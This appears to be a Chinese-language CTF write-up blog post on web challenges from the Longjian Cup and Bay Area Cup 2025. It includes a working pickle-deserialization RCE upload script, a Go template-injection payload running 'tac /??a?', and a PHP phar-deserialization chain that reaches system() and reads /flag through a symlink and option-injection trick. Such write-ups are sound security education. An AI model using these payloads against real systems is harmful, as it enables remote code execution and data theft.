+++
title= "陇剑杯2025以及湾区杯2025"
slug= "longjian-and-bay-area-cup-2025"
description= "今年学生组已经成为了上分最激烈的组（对不起兄弟，太几把搞笑了）"
date= "2025-09-08T20:01:26+08:00"
lastmod= "2025-09-08T20:01:26+08:00"
image= ""
license= ""
categories= ["赛题"]
tags= ["ssti","phar","pickle"]

+++

只简单说说，因为题目都不是很难

## LJB

### forge

Unicode字符注册，登录可以上传PKL文件，把example下载下来得知结构，写opcode写到example里面就可以解决不出网的问题

```python
import os
import pickle
import requests

url = "http://web-578d79b48d.challenge.longjiancup.cn"
cookie = {
    "session":"eyJ1c2VyX2lkIjoyfQ.aLvWng.NUtTEjboDFHFuUiboHU38M3JqdU"
}


class CHIKAWA:
    def __init__(self):
        self.model_name = "Example"
        self.data = rb"""cos
system
(V\u0066\u0069\u006e\u0064\u0020\u002f\u0020\u002d\u006e\u0061\u006d\u0065\u0020\u0022\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002e\u0070\u006b\u006c\u0022\u0020\u002d\u0074\u0079\u0070\u0065\u0020\u0066\u0020\u002d\u0065\u0078\u0065\u0063\u0020\u0073\u0068\u0020\u002d\u0063\u0020\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u003e\u0020\u0022\u0024\u0030\u0022\u0027\u0020\u007b\u007d\u0020\u005c\u003b
tR."""
        self.parameters = ""

payload = pickle.dumps(CHIKAWA())
filename = "abcd.pkl"

with open(filename, "wb") as f:
    f.write(payload)
    f.close()

res = requests.post(url+"/upload",files={"file":open(filename,"rb")},cookies=cookie)
os.remove(filename)
```

## WQB

### ez_python

首先是jwt，用`\`过一下，进去绕过yaml黑名单就行了

### ssti

go引擎的ssti，但是有部分黑名单，

```
{{.}}

{{exec "tac /??a?"}}
```

### ezreadfile

我出的很简单的一道题  https://baozongwi.xyz/p/deadsecctf2025/

```python
import http.client
import urllib.parse
import gzip
import re
import time
import socket

def _post(url, body, headers=None, timeout=None):
    u = urllib.parse.urlsplit(url)
    host = u.hostname
    port = u.port or (80 if u.scheme == 'http' else 443)
    path = u.path or '/'
    if u.query:
        path += '?' + u.query
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("POST", path, body=body, headers=headers or {'Content-Type':'application/x-www-form-urlencoded'})
        resp = conn.getresponse()
        data = resp.read().decode('utf-8', 'ignore')
        return data
    finally:
        conn.close()

def write(url):
    with open('phar.phar', 'rb') as f:
        raw = f.read()
    gz = gzip.compress(raw)
    v0 = urllib.parse.quote_from_bytes(gz)
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}' + '&0=' + v0
    r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'})
    m = re.search(r'/tmp/[0-9a-f]{32}\.phar', r)
    if not m:
        return None
    return m.group(0)

def read(url, phar_path):
    v0 = urllib.parse.quote(phar_path, safe='')
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}' + '&0=' + v0
    r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'})
    m = re.search(r'flag', r)
    return m.group(0) if m else None

def runtime_exec(url, phar_path, cmd):
    v0 = urllib.parse.quote(phar_path, safe='')
    v2 = urllib.parse.quote(cmd, safe='')
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}' + '&0=' + v0 + '&2=' + v2
    r = _post(url + "?1=system($_POST[2]);", body, {'Content-Type':'application/x-www-form-urlencoded'})
    return r


def getflag(url, phar_path):
    r1 = runtime_exec(url, phar_path,"pwd")
    m1 = re.search(r'/var/www/html', r1)
    if m1 :
        print("[+] 命中标记，可以进行下一步")
        runtime_exec(url, phar_path, "touch -- -H")
        print("成功创建覆盖项")
        time.sleep(1)
        runtime_exec(url, phar_path, "ln -s /flag flag")
        print("成功创建软连接")
        time.sleep(15)
        r2 = runtime_exec(url, phar_path, "cat backup/flag")
        m2 = re.search(r'flag\{[^}\r\n]+\}', r2, re.I)
        if m2:
            return m2.group(0)
    else :
        print("[-] 未命中标记，退出或重试")

if __name__ == '__main__':
    url = "http://156.239.238.130:8000/"
    phar_path = write(url)
    if phar_path:
        time.sleep(1)
        print(read(url, phar_path))
        time.sleep(1)
        flag=getflag(url, phar_path)
        print(flag)
```

## 小结

从nepctf2025我就看出来现在国内的学生PY比往年严重的不是一点半点，你要是打其他组可能后面排名不会怎么变，但是学生是酷酷的掉，不过有句话说的好，大家都PY就相当于没PY，拿不出WP就得破该。

中途比赛的时候还有好几位师傅来问我题是我出的吗？说是有我出题的感觉，我挺好奇我出的题到底是什么感觉，能让你们锁定我😆

